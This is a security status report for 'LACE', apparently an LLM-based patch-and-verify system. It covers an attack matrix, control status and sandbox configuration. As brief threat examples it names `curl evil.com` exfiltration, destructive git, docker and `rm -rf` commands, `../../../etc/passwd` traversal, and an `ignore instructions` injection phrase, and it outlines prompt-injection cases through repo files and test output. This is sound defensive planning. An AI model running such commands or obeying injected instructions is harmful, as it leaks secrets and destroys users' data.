# LACE Security Research — Analysis & Status

**Status:** HYPOTHESIS · **Scope:** Aggregated security analysis. No implementation yet.
**Date:** 2026-09-03 · **Track:** B — Security/Trust Validation
**Companion:** `docs/security/threat-model.md`, `docs/security/trust-boundaries.md`, `docs/security/data-handling.md`, `docs/security/security-requirements.md`
**Predecessors:** `research/security/attack-cases.md`, `research/security/redaction-tests.md`, `research/security/injection-tests.md`, `research/security/sandbox-tests.md`

---

## Purpose

Consolidate security research findings, track implementation status of all controls, and produce the attack matrix required by the orchestrator. This is the single source of truth for security readiness.

---

## Attack Matrix (per orchestrator requirements)

| Attack | Precondition | Expected Control | Test | Result | Residual Risk |
|---|---|---|---|---|---|
| **1. Prompt injection via repository files** | Repo contains malicious issue/test/comment text | Structured evidence extraction; delimited blocks; fixed hierarchy | INJ-DIR-01, INJ-IND-01, INJ-HIE-01 | NOT TESTED | Injection in prose test output truncated; hierarchy violation attempts contained |
| **2. Prompt injection via test output** | Test prints injection prose | Structured parsing (JUnit/XML); bounded excerpts; delimiters | INJ-IND-01 to INJ-IND-04 | NOT TESTED | Huge prose truncated; ANSI/OSC stripped |
| **3. Malicious instructions in patches** | Model outputs patch with `ignore instructions` in context | Layer 1 static screen rejects; patch never in evidence | INJ-PAT-01, INJ-PAT-02 | NOT TESTED | Patch screening at Layer 1 is primary defense |
| **4. Secrets in environment variables** | Host env has `SECRET=value`; test accesses it | Env allowlist deny-by-default; redaction at capture | AC-T5-02, SBX-ENV-01 | NOT TESTED | Allowlist must be complete; unknown vars leak |
| **5. Secrets in tracebacks/logs** | Failed command echoes token; traceback contains secret | Redaction at capture + before re-prompt; sanitized argv | AC-T5-01, RED-CMD-01 | NOT TESTED | Redaction recall <100% (evasion possible) |
| **6. Data leakage via retry feedback** | Evidence sent to provider contains secrets | Redaction before re-prompt; structured evidence only | RED-T5-01, INJ-DIR-02 | NOT TESTED | Redaction must be perfect; provider sees all prompt content |
| **7. Data leakage via persisted logs** | Ledger stores unredacted output | Redact-then-write; hash-chained JSONL; bounded retention | RED-T5-01 to RED-T5-06 | NOT TESTED | Tamper-evident not tamper-proof; host compromise = total loss |
| **8. Network exfiltration** | Malicious patch/test tries `curl evil.com` | No network egress (default); Layer 1 screens network calls | SBX-NET-01 to 06, AC-T3-01 | NOT TESTED | Opt-in network for deps creates hole; must be allowlisted |
| **9. Destructive git operations** | Test/hook runs `git push`, `git clean -fdx` | Throwaway worktree; denylist; no push/merge in loop | AC-T9-01, SBX-DES-01, 02 | NOT TESTED | Worktree isolation contains `git clean`; denylist blocks push |
| **10. Destructive Docker operations** | Test runs `docker system prune` | No docker socket in executor; denylist | AC-T9-02, SBX-DES-04 | NOT TESTED | If Docker-in-Docker used, inner daemon at risk |
| **11. Repository hook execution** | Repo has `pre-commit` / `prepare-commit-msg` hooks | `--no-verify`; hooks never auto-run in verification | AC-T1-02, SR-T1-03 | NOT TESTED | Must enforce at verification command level |
| **12. Container/worktree escape** | Malicious code exploits kernel/container vuln | Drop all caps; seccomp; user namespace; read-only baseline | SBX-ESC-01 to 06 | NOT TESTED | Zero-day escape always possible; host compromise = T8 |
| **13. Persistence of sensitive material** | Ledger retains secrets beyond task | Bounded retention (task + 30d); prune job | RED-T5-06, SR-CC-04 | NOT TESTED | Prune job must be reliable; backup may retain |
| **14. Provider-side exposure** | Provider receives full prompt with repo context | Minimize context (layered); pin model (D-009); no secrets in prompt | AC-T7-01, SR-T7-03, 04 | NOT TESTED | Provider sees everything in prompt; cannot prevent |
| **15. Malicious path/file targeting** | Patch uses `../../../etc/passwd` or symlinks | Read-only baseline; worktree isolation; path validation | AC-T1-03, AC-T1-04, SBX-FS-06 | NOT TESTED | Symlink handling OS-dependent; must test |
| **16. Oversized output/log poisoning** | Test prints 10MB garbage | Bounded capture (800 chars, 20 lines); truncation markers | AC-T6-01, SBX-RES-01 | NOT TESTED | DoS via resource exhaustion mitigated by limits |
| **17. Retry-loop abuse** | Attacker triggers infinite retries | Bounded retries (≤2 global); provider stops = 0 budget | SR-T9-04, recovery-policy.md | DESIGNED (policy) | Policy enforced in code; must verify |
| **18. Failure-induced privilege escalation** | Verification failure triggers debug mode with more perms | No debug mode escalation; fixed allowlist; no sudo | SBX-PRIV-01 to 08 | NOT TESTED | Must ensure no fallback to higher privs |

---

## Control Implementation Status (from security-requirements.md)

### Summary
| Status | Count | Details |
|---|---|---|
| **VERIFIED** | 0 | No controls tested adversarially |
| **TESTED** | 0 | No automated tests passing |
| **IMPLEMENTED** | 0 | No code exists |
| **DESIGNED** | 7 | Policy docs only (threat-model, trust-boundaries, data-handling, recovery-policy, core concepts) |
| **NOT IMPLEMENTED** | 31 | All MUST requirements |

### Critical Gaps (blocking GO-TO-PROTOTYPE)

| Gap | Requirements | Impact |
|---|---|---|
| **No verification executor** | SR-T1-01 to 05, SR-T3-01 to 05, SR-T9-01 to 04 | Cannot run verification safely |
| **No redaction engine** | SR-T5-01 to 06, SR-T6-01 to 03 | Secrets leak to ledger, provider, prompts |
| **No injection-hardened prompt pipeline** | SR-T4-01 to 04 | Prompt injection path open |
| **No sandbox profile** | SR-T1-01, SR-T1-02, SR-T1-04, SR-CC-03 | No isolation guarantee |
| **No destructive command denylist** | SR-T9-02 | `git push`, `rm -rf`, etc. executable |
| **No env allowlist** | SR-T5-04 | All host secrets leak to executor |
| **No command allowlist** | SR-T9-02 (verification commands) | Arbitrary shell execution possible |

### Designed but Unimplemented (policy only)

| Control | Document | Requirements |
|---|---|---|
| Failure class separation (D-008) | `docs/07-recovery-policy.md` | SR-T7-02, SR-CC-07 |
| Provider pinning (D-009) | `context/decisions.md` | SR-T7-03 |
| Layered verification (L1→L2→L3) | `docs/06-recovery-model.md` | SR-T3-05, SR-CC-05 |
| Redaction policy (denylist + env-value + structural) | `docs/security/data-handling.md` §5 | SR-T5-01, 02 |
| Prompt hierarchy (fixed + delimited) | `docs/security/trust-boundaries.md` §6 | SR-T4-01, 02, 03 |
| Hash-chained JSONL ledger | `docs/security/data-handling.md` §7 | SR-CC-04 |
| TCB definition (<2000 LOC) | `docs/security/trust-boundaries.md` §5 | Architecture |

---

## Redaction Analysis (from redaction-tests.md)

**Current State:** No implementation. Test corpus designed (C1–C4).

**Known Evasion Vectors (will miss):**
- Base64/hex/Unicode encoded secrets (RED-EVA-04, 05, 06)
- Character-interleaved (RED-EVA-03)
- Unknown prefix variations (RED-EVA-06)
- Custom secret formats not in denylist

**Mitigation Strategy:**
- Primary: Env allowlist (prevents ingress) — SR-T5-04
- Secondary: Redaction (catches accidental leakage) — SR-T5-01, 02
- Acceptance: Cannot prove zero-leak; document evasion cases

**Target Recall:** ≥99% on known patterns (C1)
**Target Precision:** ≥99.9% (false positive <0.1%)

---

## Injection Analysis (from injection-tests.md)

**Current State:** No implementation. Test fixtures designed (6 categories, 20+ cases).

**Pipeline Defenses (in order):**
1. Structured extraction (ignores prose) → INJ-IND-*
2. Bounded excerpts (truncates huge/encoded) → INJ-IND-04, INJ-EVA-*
3. Redaction (strips secrets) → RED-*
4. Delimited evidence blocks (contains injection) → INJ-DIR-*, INJ-HIE-*
5. Fixed instruction hierarchy (system > policy > evidence) → INJ-HIE-*

**Residual Risk:** Model confusion despite structure (LLM01 fundamental limitation). Static structure validation ≠ model behavior proof.

**Testing Strategy:** Static (100%) → Mock (100%) → Real model spot check (5 tests)

---

## Sandbox Analysis (from sandbox-tests.md)

**Current State:** No implementation. Target profile specified; 40+ test cases designed.

**Two Implementation Paths:**
| Path | Isolation Strength | Complexity | Portability |
|---|---|---|---|
| **Docker container** | High (kernel-level) | Medium | Requires Docker daemon |
| **Git worktree + user namespace** | Medium (OS-level) | Lower | Works everywhere git works |

**Recommendation:** Implement both; Docker as primary, worktree as fallback. Document guarantees per path.

**Critical Docker Config:**
- `--cap-drop=ALL --security-opt seccomp=profile.json --network=none --pids-limit=100 --memory=2g --cpus=2 --user=1000:1000 --read-only --tmpfs /tmp --volume baseline:/repo:ro --volume attempt:/work:rw`

**Critical Worktree Config:**
- `unshare -r -m -p -f --propagation=slave` + bind mounts (ro baseline, rw attempt) + resource limits via `systemd-run` or `cgroups`

---

## Cross-Workstream Dependencies

| Security Requirement | Depends On | Workstream |
|---|---|---|
| Structured evidence extraction | Core model (Evidence entity) | C |
| Layered verification (L1/L2/L3) | Recovery policy | C |
| Failure classification (D-008) | Terminology, core concepts | C |
| Provider pinning (D-009) | Experiment rules | C |
| Retry budget (≤2) | Recovery policy | C |
| Evidence budget (bounded) | Measurement contract | C |

---

## Security Readiness Assessment

| Dimension | Current | Target for GO-TO-PROTOTYPE |
|---|---|---|
| **Verification executor** | NOT IMPLEMENTED | TESTED (Docker + worktree) |
| **Redaction engine** | NOT IMPLEMENTED | TESTED (recall ≥99%, precision ≥99.9%) |
| **Injection-hardened pipeline** | NOT IMPLEMENTED | TESTED (static 100%, mock 100%, spot check 5/5) |
| **Sandbox profile** | NOT IMPLEMENTED | TESTED (all SBX-* pass) |
| **Destructive command controls** | NOT IMPLEMENTED | TESTED (denylist + allowlist) |
| **Env allowlist** | NOT IMPLEMENTED | TESTED |
| **Command allowlist** | NOT IMPLEMENTED | TESTED |
| **Ledger (hash-chained, redacted, bounded)** | NOT IMPLEMENTED | TESTED |
| **Failure class separation** | DESIGNED (policy) | IMPLEMENTED + TESTED |
| **Provider pinning** | DESIGNED (config) | IMPLEMENTED + TESTED |

**Overall: LOW** (0/31 MUST requirements TESTED or VERIFIED)

---

## Recommended Next Steps (Priority Order)

1. **Implement verification executor (Docker path)** — enables all isolation tests
   - Minimal: `docker run` wrapper with target profile
   - Test: SBX-LIF, SBX-NET, SBX-FS, SBX-PRIV, SBX-RES

2. **Implement redaction engine** — enables secret handling tests
   - Denylist + env-value + structural rules
   - Test: RED-* (C1 synthetic), RED-CMD-*

3. **Implement evidence extractor + prompt renderer** — enables injection tests
   - Structured parsing (JUnit/XML/TAP)
   - Bounded excerpts + delimiters + fixed hierarchy
   - Test: INJ-* static structure + mock

4. **Implement destructive command denylist + verification command allowlist**
   - Block list + argv-array-only execution
   - Test: SBX-DES-*, SBX-CMD-*

5. **Implement env allowlist**
   - Deny-by-default with task-declared exceptions
   - Test: SBX-ENV-*

6. **Implement hash-chained JSONL ledger with bounded retention**
   - Append-only, redacted writes, prune job
   - Test: SR-CC-04, SR-T5-06

7. **Run adversarial escape tests (SBX-ESC-*)** — requires privileged environment
   - Document results; accept residual risk

---

## Provenance

- Aggregated from: `research/security/attack-cases.md`, `research/security/redaction-tests.md`, `research/security/injection-tests.md`, `research/security/sandbox-tests.md`
- Requirements from: `docs/security/security-requirements.md`
- Threat model from: `docs/security/threat-model.md`
- Status labels per: `docs/security/security-requirements.md` §4
- Orchestrator requirements: Attack matrix + control classification